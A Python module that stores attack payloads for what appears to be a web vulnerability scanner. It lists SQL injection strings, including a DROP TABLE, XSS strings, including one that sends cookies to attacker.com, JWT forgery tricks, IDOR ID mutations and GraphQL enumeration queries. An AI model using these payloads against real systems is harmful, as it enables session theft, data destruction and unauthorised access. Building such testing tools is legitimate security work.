"""
Vulnerability payload database.
Stores common payloads for SQLi, XSS, CSRF, IDOR, JWT attacks, and GraphQL queries.
No execution logic — payloads only.
"""

from typing import List, Dict, Any, Callable


# SQL Injection Payloads
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1/*",
    "admin' --",
    "' UNION SELECT NULL,NULL,NULL--",
    "' AND SLEEP(5)--",
    "'; DROP TABLE users;--",
    "' OR 'a'='a",
    "1' AND '1'='1",
    "' OR 'x'='x' /*",
    "1' UNION SELECT VERSION()--",
    "' AND 1=CAST(COUNT(*) AS INT)--",
]

# Cross-Site Scripting Payloads
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<iframe src=javascript:alert('XSS')></iframe>",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "'\"><script>alert('XSS')</script>",
    "<marquee onstart=alert('XSS')>",
    "<details open ontoggle=alert('XSS')>",
    "<img src=x onerror=\"fetch('http://attacker.com?cookie='+document.cookie)\">",
    "<script>eval(atob('YWxlcnQoJ1hTUycpOw=='))</script>",
]

# CSRF Detection Indicators
CSRF_CHECK = {
    "indicators": [
        "csrf_token",
        "csrf-token",
        "_csrf",
        "token",
        "nonce",
        "authenticity_token",
        "request_token",
        "_token",
        "xsrf-token",
        "x-csrf-token",
    ],
    "missing_token_indicators": [
        "Cross-Site Request Forgery",
        "CSRF token",
        "invalid token",
        "expired token",
    ]
}

# IDOR Mutation Patterns
IDOR_PATTERNS: List[Callable[[Any], Any]] = [
    lambda x: int(x) + 1 if isinstance(x, str) and x.isdigit() else None,
    lambda x: int(x) - 1 if isinstance(x, str) and x.isdigit() else None,
    lambda x: int(x) * 2 if isinstance(x, str) and x.isdigit() else None,
    lambda x: "0" if isinstance(x, str) and x.isdigit() else None,
    lambda x: str(int(x) if isinstance(x, str) and x.isdigit() else 0),
    lambda x: x + "0" if isinstance(x, str) else None,
    lambda x: x[:-1] if isinstance(x, str) and len(x) > 1 else None,
]

# JWT Attack Vectors
JWT_ATTACKS = [
    {
        "type": "alg_none",
        "description": "Change algorithm to 'none' to bypass signature verification",
        "header_override": {"alg": "none", "typ": "JWT"},
        "payload_override": None,
    },
    {
        "type": "role_escalation",
        "description": "Modify role claim to admin",
        "payload_override": {"role": "admin", "isAdmin": True, "admin": True},
    },
    {
        "type": "user_id_tampering",
        "description": "Change user ID in token",
        "payload_override": {"userId": "1", "uid": "1", "id": "1"},
    },
    {
        "type": "expired_token_bypass",
        "description": "Extend token expiration",
        "payload_override": {"exp": 9999999999},
    },
    {
        "type": "not_before_bypass",
        "description": "Remove not-before restriction",
        "payload_override": {"nbf": 0},
    },
]

# GraphQL Introspection Query
GRAPHQL_INTROSPECTION = """
query IntrospectionQuery {
  __schema {
    types {
      name
      kind
      description
      fields {
        name
        type {
          kind
          name
          ofType {
            kind
            name
          }
        }
      }
      inputFields {
        name
        type {
          kind
          name
        }
      }
    }
    queryType {
      name
      fields {
        name
        args {
          name
          type {
            kind
            name
          }
        }
      }
    }
    mutationType {
      name
      fields {
        name
        args {
          name
          type {
            kind
            name
          }
        }
      }
    }
  }
}
"""

# GraphQL Attack Payloads
GRAPHQL_ATTACKS = [
    {
        "type": "introspection",
        "query": GRAPHQL_INTROSPECTION,
        "description": "GraphQL introspection to discover schema"
    },
    {
        "type": "batch_query",
        "query": """
            query {
              user1: user(id: 1) { id name email }
              user2: user(id: 2) { id name email }
              user3: user(id: 3) { id name email }
            }
        """,
        "description": "Batch queries to enumerate users"
    },
    {
        "type": "alias_overflow",
        "query": """
            query {
              a1: user(id: 1) { id }
              a2: user(id: 2) { id }
              a3: user(id: 3) { id }
            }
        """,
        "description": "Query aliasing for data enumeration"
    },
]


def get_payloads_for_param(param_name: str, param_value: Any = None) -> List[Dict[str, Any]]:
    """
    Get appropriate payloads based on parameter name.
    
    Args:
        param_name: Name of the parameter (e.g., 'id', 'search', 'email')
        param_value: Current value of the parameter (optional)
        
    Returns:
        List of payload dictionaries with 'type' and 'value' keys
    """
    payloads = []
    param_lower = param_name.lower()
    
    # ID/User/Account parameters — use IDOR payloads
    if any(keyword in param_lower for keyword in ["id", "user", "account", "uid", "userid", "user_id", "owner", "customer"]):
        for pattern in IDOR_PATTERNS:
            try:
                mutated = pattern(param_value)
                if mutated is not None:
                    payloads.append({
                        "type": "IDOR",
                        "value": mutated,
                        "original": param_value,
                        "pattern": pattern.__doc__ or "ID mutation"
                    })
            except:
                pass
    
    # Search/Query/Input parameters — use XSS + SQLi payloads
    if any(keyword in param_lower for keyword in ["search", "query", "input", "text", "content", "message", "comment", "name", "title"]):
        # Add XSS payloads
        for xss_payload in XSS_PAYLOADS:
            payloads.append({
                "type": "XSS",
                "value": xss_payload,
                "original": param_value
            })
        
        # Add SQLi payloads
        for sqli_payload in SQLI_PAYLOADS:
            payloads.append({
                "type": "SQLi",
                "value": sqli_payload,
                "original": param_value
            })
    
    # Email parameters — use XSS payloads
    if any(keyword in param_lower for keyword in ["email", "mail", "contact", "sender", "recipient"]):
        for xss_payload in XSS_PAYLOADS:
            payloads.append({
                "type": "XSS",
                "value": xss_payload,
                "original": param_value
            })
    
    # Password parameters — test for weak validation
    if any(keyword in param_lower for keyword in ["password", "pwd", "pass"]):
        weak_passwords = [
            "", "password", "123456", "admin", "admin123"
        ]
        for weak_pwd in weak_passwords:
            payloads.append({
                "type": "weak_password",
                "value": weak_pwd,
                "original": param_value
            })
    
    # Token/Auth parameters — use JWT attacks
    if any(keyword in param_lower for keyword in ["token", "auth", "jwt", "api_key", "apikey", "secret"]):
        for jwt_attack in JWT_ATTACKS:
            payloads.append({
                "type": jwt_attack.get("type", "JWT"),
                "value": jwt_attack.get("payload_override", {}),
                "description": jwt_attack.get("description", ""),
                "original": param_value
            })
    
    # Filter/Category parameters — use SQLi
    if any(keyword in param_lower for keyword in ["filter", "category", "type", "status", "sort"]):
        for sqli_payload in SQLI_PAYLOADS:
            payloads.append({
                "type": "SQLi",
                "value": sqli_payload,
                "original": param_value
            })
    
    # Price/Amount parameters — test for integer overflow
    if any(keyword in param_lower for keyword in ["price", "amount", "quantity", "total", "cost"]):
        numeric_payloads = [
            "999999999999999",
            "-1",
            "0",
            "2147483647",  # Max 32-bit int
            "9223372036854775807",  # Max 64-bit int
        ]
        for num_payload in numeric_payloads:
            payloads.append({
                "type": "numeric_overflow",
                "value": num_payload,
                "original": param_value
            })
    
    # If no specific matches, return basic payloads
    if not payloads:
        for sqli_payload in SQLI_PAYLOADS[:3]:
            payloads.append({
                "type": "SQLi",
                "value": sqli_payload,
                "original": param_value
            })
        for xss_payload in XSS_PAYLOADS[:3]:
            payloads.append({
                "type": "XSS",
                "value": xss_payload,
                "original": param_value
            })
    
    return payloads
